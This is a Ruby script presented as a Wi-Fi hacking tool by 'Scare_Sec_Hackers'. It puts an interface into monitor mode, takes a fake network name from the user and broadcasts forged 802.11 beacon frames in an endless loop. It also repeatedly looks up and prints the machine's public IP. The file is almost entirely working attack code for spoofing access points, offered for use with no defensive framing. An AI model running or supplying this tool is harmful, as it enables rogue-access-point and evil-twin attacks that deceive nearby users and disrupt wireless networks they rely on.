require 'colorize'
require 'packetgen'
require 'open-uri'


def rouge
    puts '[+] Setting Mon0'
    sleep 1 
    system("iw phy phy1 interface add mon0 type monitor")
    system("ifconfig mon0 up")
    iface     = 'mon0'
    broadcast = "ff:ff:ff:ff:ff:ff"
    bssid     = "aa:aa:aa:aa:aa:aa"
    print("Fake SSID Name >>> ")
    ssid      = gets.chomp
    while true
        pkt = PacketGen.gen('RadioTap').add('Dot11::Management', mac1: broadcast, mac2: bssid, mac3: bssid)
                                    .add('Dot11::Beacon', interval: 0x600, cap: 0x401)
        pkt.dot11_beacon.elements << {type: 'SSID', value: ssid}
        pp pkt
        100000.times do
        pkt.to_w(iface)
        remote_ip = URI.open('http://whatismyip.akamai.com').read
        puts '[+] ~~> Using IP    '.colorize(:red) + remote_ip 
        puts '[+] ~~> Fake Beacon '.colorize(:red) + ssid + ' USING ~~> '.colorize(:blue) + iface
        end
    end
end

def main
    puts <<-'EOF'.colorize(:red)
 _  _  _  _____   _____  _______ _______  ______
 |  |  | |     | |     | |______ |______ |_____/
 |__|__| |_____| |_____| |       |______ |    \_
                                                
    Wifi-Hacking and Discovery
                            V 2.0
                                 Scare_Sec_Hackers
 ──────────────────────────────────────────────
            __
         __/o \_
         \____  \
             /   \
       __   //\   \
    __/o \-//--\   \_/
    \____  ___  \  |
         ||   \ |\ |
        _||   _||_||
    EOF
end

system("clear")
main()
rouge()